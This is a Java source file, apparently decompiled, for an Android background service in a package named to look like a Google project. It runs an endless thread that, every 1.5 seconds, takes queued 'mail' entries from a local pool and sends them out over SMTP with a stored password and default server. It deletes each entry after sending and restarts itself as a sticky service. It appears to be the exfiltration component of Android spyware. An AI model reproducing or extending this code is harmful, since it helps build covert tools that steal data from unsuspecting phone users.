package com.googleprojects.mm;

import android.app.Service;
import android.content.Intent;
import android.os.IBinder;

public class SOMailPoolService extends Service {

    class SOMailSenderService extends Thread {
        SOMailSenderService() {
        }

        public void run() {
            while (true) {
                SOMMailPool mail = SOMailPoolCPUtil.getFirstMail(SOMailPoolService.this);
                if (mail != null) {
                    try {
                        new MMMailSender(mail.sender, SOMailCPUtil.mail_pwd, SOMailCPUtil.default_smtp_addr, SOMailCPUtil.default_smtp_port).sendMail(MMMailContentUtil.MM_MESSAGE_SUBJECT, mail.mailBody, mail.sender, mail.receiver);
                        SOMailPoolCPUtil.deleteMail(SOMailPoolService.this, mail._id);
                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                }
                try {
                    Thread.sleep(1500);
                } catch (Exception e2) {
                }
            }
        }
    }

    public void onCreate() {
        super.onCreate();
        new SOMailSenderService().start();
    }

    public IBinder onBind(Intent intent) {
        return null;
    }

    public int onStartCommand(Intent intent, int flags, int startId) {
        super.onStartCommand(intent, flags, startId);
        return 1;
    }
}
